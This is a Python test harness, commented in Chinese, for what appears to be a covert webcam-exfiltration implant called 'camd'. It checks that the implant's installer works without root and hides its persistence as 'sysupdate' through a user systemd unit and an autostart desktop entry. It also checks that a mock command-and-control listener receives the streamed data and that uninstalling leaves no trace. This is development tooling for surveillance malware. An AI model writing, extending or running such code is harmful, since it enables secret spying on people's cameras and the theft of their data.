#!/usr/bin/env python3
"""用户级部署守卫（非 root 随机目标）。

覆盖：onekey.sh 在 uid!=0 时不再 DIE，而是切到 $HOME 落点；camd 在
系统级驻留一项都装不上时回退到 persist_user_ensure（用户级 systemd +
autostart）；用户级单元 WantedBy 必须是 default.target；卸载必须连
autostart 一起清。

正向：安装 -> 状态 -> 卸载 -> 无残留，且 C2 真收到字节。
反向：家目录不可写时安装必须失败（证明 HOME 守卫不是恒绿）。
"""
import os, sys, subprocess, tempfile, shutil, socket, threading, stat, binascii, time

HERE = os.path.dirname(os.path.abspath(__file__))          # 21_exfil/tests
X21  = os.path.dirname(HERE)                                # 21_exfil
ROOT = os.path.dirname(X21)                                 # repo root
CAMD = os.path.join(ROOT, 'agent_windows', 'build', 'linux', 'camd')
MAKE = os.path.join(X21, 'make_onekey.py')

PASS = 0
FAIL = 0
def chk(cond, name, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[PASS] " + name)
    else:
        FAIL += 1
        print("[FAIL] " + name + (" -- " + detail if detail else ""))

def free_port():
    s = socket.socket()
    s.bind(('127.0.0.1', 0))
    p = s.getsockname()[1]
    s.close()
    return p

class C2(threading.Thread):
    def __init__(self, port):
        threading.Thread.__init__(self, daemon=True)
        self.total = 0
        self.conns = 0
        self.stop = False
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(('127.0.0.1', port))
        self.srv.listen(8)
    def run(self):
        while not self.stop:
            try:
                c, _ = self.srv.accept()
            except OSError:
                break
            self.conns += 1
            c.settimeout(3)
            try:
                while True:
                    b = c.recv(65536)
                    if not b:
                        break
                    self.total += len(b)
            except Exception:
                pass
            c.close()
    def close(self):
        self.stop = True
        try:
            self.srv.close()
        except Exception:
            pass

def genkey():
    k = binascii.hexlify(os.urandom(32)).decode()
    while k[:16] == k[16:]:
        k = binascii.hexlify(os.urandom(32)).decode()
    return k

def run_as(uid, home, args, env_extra=None):
    env = os.environ.copy()
    env['HOME'] = home
    if env_extra:
        env.update(env_extra)
    cmd = ['setpriv', '--reuid=%d' % uid, '--regid=%d' % uid,
           '--clear-groups', 'sh'] + args
    return subprocess.run(cmd, env=env, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, timeout=120)

def main():
    if not os.path.exists(CAMD):
        chk(False, "前置: camd 产物存在", CAMD)
        return 1
    onekey = os.path.join(tempfile.gettempdir(), 'ok_user_%d.sh' % os.getpid())
    r = subprocess.run([sys.executable, MAKE, 'amd64=' + CAMD, '-o', onekey],
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if r.returncode != 0:
        chk(False, "前置: 生成一键脚本", r.stdout.decode()[-300:])
        return 1
    os.chmod(onekey, 0o755)

    port = free_port()
    c2 = C2(port)
    c2.start()

    home = tempfile.mkdtemp(prefix='uhome')
    os.chmod(home, 0o777)
    key = genkey()
    out_all = ""

    try:
        # ---- 正向：非 root 安装 ----
        r = run_as(65534, home,
                   [onekey, 'install', '--c2', '127.0.0.1:%d' % port,
                    '--backend', 'v4l2', '--key', key])
        out = r.stdout.decode(errors='replace')
        out_all += out
        chk(r.returncode == 0, "F1 非 root 安装 rc=0", "rc=%d" % r.returncode)
        chk('切换用户级部署' in out, "F2 切换到用户级部署（不再 DIE 需要 root）")
        name = 'sysupdate'
        unit = os.path.join(home, '.config/systemd/user/%s.service' % name)
        conf = os.path.join(home, '.config/%s/%s.conf' % (name, name))
        bind = os.path.join(home, '.local/bin/%s' % name)
        runsh = os.path.join(home, '.local/lib/%s/run.sh' % name)
        auto = os.path.join(home, '.config/autostart/%s.desktop' % name)
        chk(os.path.isfile(unit), "F3 用户级单元已写入", unit)
        chk(os.path.isfile(conf), "F4 配置已写入 $HOME", conf)
        chk(os.path.isfile(bind) and os.access(bind, os.X_OK),
            "F5 二进制已安装且可执行", bind)
        chk(os.path.isfile(runsh), "F6 启动器已写入", runsh)
        chk(os.path.isfile(auto), "F7 autostart 桌面条目已写入（camd 用户级驻留）", auto)
        if os.path.isfile(unit):
            u = open(unit, encoding='utf-8', errors='replace').read()
            chk('WantedBy=default.target' in u,
                "F8 用户级单元 WantedBy=default.target")
            chk('multi-user.target' not in u,
                "F9 用户级单元不得写 multi-user.target（用户实例没有该 target）")
        if os.path.isfile(conf):
            c = open(conf, encoding='utf-8', errors='replace').read()
            chk('CAMD_KEY=' in c, "F10 配置含密钥（由环境注入）")
        time.sleep(0.5)
        chk(c2.total > 0, "F11 C2 实收信元字节 > 0", "total=%d conns=%d" % (c2.total, c2.conns))
        chk("用户级驻留:" in out or "persist_user=1" in out,
            "F12 camd 报告用户级驻留生效")

        # ---- status（非 root 必须能定位到 $HOME 落点）----
        r = run_as(65534, home, [onekey, 'status'])
        sout = r.stdout.decode(errors='replace')
        chk('配置: 存在' in sout and '二进制: 存在' in sout,
            "F13 status 在非 root 下能定位落点", sout[:200])

        # ---- 卸载 ----
        r = run_as(65534, home, [onekey, 'uninstall'])
        uout = r.stdout.decode(errors='replace')
        chk(r.returncode == 0, "F14 卸载 rc=0", "rc=%d" % r.returncode)
        left = [p for p in (unit, conf, bind, runsh, auto,
                            os.path.join(home, '.config/%s' % name),
                            os.path.join(home, '.local/lib/%s' % name))
                if os.path.exists(p)]
        chk(not left, "F15 卸载后无残留（含 autostart）", "残留:%s" % left)

        # ---- 反向：家目录不可写时必须失败 ----
        bad = '/nonexistent-%d' % os.getpid()
        r2 = run_as(65534, bad,
                    [onekey, 'install', '--c2', '127.0.0.1:%d' % port,
                     '--backend', 'v4l2', '--key', key])
        o2 = r2.stdout.decode(errors='replace')
        chk(r2.returncode != 0, "R1 家目录不可写时安装必须失败（HOME 守卫非恒绿）",
            "rc=%d out=%s" % (r2.returncode, o2[:200]))
    finally:
        c2.close()
        shutil.rmtree(home, ignore_errors=True)
        if os.path.exists(onekey):
            os.remove(onekey)

    print("\n计数: 成功 %d  失败 %d" % (PASS, FAIL))
    if FAIL:
        print("\n----- 安装输出（供诊断）-----")
        print(out_all[-3000:])
    return 1 if FAIL else 0

if __name__ == '__main__':
    sys.exit(main())
